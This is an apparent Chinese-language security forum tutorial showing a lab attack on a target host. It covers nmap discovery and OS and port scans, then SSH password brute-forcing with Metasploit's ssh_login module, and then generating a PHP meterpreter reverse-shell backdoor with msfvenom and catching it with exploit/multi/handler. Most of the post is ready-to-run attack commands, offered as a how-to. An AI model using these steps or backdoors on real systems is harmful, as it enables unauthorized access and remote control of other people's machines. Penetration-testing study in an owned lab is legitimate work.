
# [原创]Metasploit后门以及跨平台后门生成

[TOC]

## 1. Metasploit对目标主机SSH爆破

实验原理：靶机 root 用户存在弱口令漏洞，利用枚举的方法破解目标主机 ssh 服务。

### 1.1 爆破过程

1. 验证局域网内部存活主机：`nmap -sP 192.168.73.0/24`；得到靶机 IP。

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_EGX9JD2G68MBT7S.png)

2. 扫描靶机的操作系统：`nmap -O 192.168.73.128`；得到靶机的操作系统及版本号。

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_9FHEYMZ9P22KSQ6.png)

3. 扫描靶机的端口开放及应用程序的版本号：`nmap -sV -Pn 192.168.73.128`；发现 22 端口开放，其应用程序为 ssh。

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_P4NXGQS9YNJFZHV.png)

4. 打开 Metasploit 工具，利用 msf `ssh_login` 模块暴力破解靶机 ssh 密码：`use auxiliary/scanner/ssh/ssh_login`；进入模块 `show options` 配置。

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_X8XVMKZAHQFGVGB.png)

5. 建立用户名字典及密码字典（为了减少爆破时间，用户名及密码设置特定的几个即可）。

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_MWY8KGTWZSSH9MW.png)

   - 将 `user.txt` 和 `pass.txt` 文件放到 kali linux 指定目录下。

6. 准备进行 ssh 爆破：设置用户名字典和密码字典的路径；设置靶机的 IP 地址；设置线程为 50；开始执行。

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_UYMPCYXSJR7YMQF.png)

   - `exploit` 之后，没有显示；将 `VERBOSE` 设置为 `true` 即可。

7. 等待 ssh 爆破执行完毕。

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_E8FU62RGNFD64A4.png)

8. 开始链接。

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_F85N45MFWKRNUSH.png)

## 2. PHP后门生成

1. 示例指令：

   ```
   msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.73.131 -f raw >/root/test.php
   ```

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_GWGBSKA2EM2Q9T5.png)

   - `LHOST`：攻击者 IP

   - PHP 后门代码

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_PR75328P8GCF85E.png)

2. 配置 `Metasploit`，`exploit` 监听：

   ```
   search exploit/hanler  // (exploit/multi/handler：通用有效负载处理程序)
   use exploit/multi/handler        // 使用模块
   show options         // 配置
   set LHOST 192.168.73.131
   set payload php/meterpreter/reverse_tcp         // 设置测试的载荷
   exploit            // 监听
   ```

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_9SH4E3GWKYN3RM3.png)

   - php 后门使用

   ![](https://bbs.kanxue.com/upload/attach/201910/828426_9MEH6EHDP9BY6EA.png)
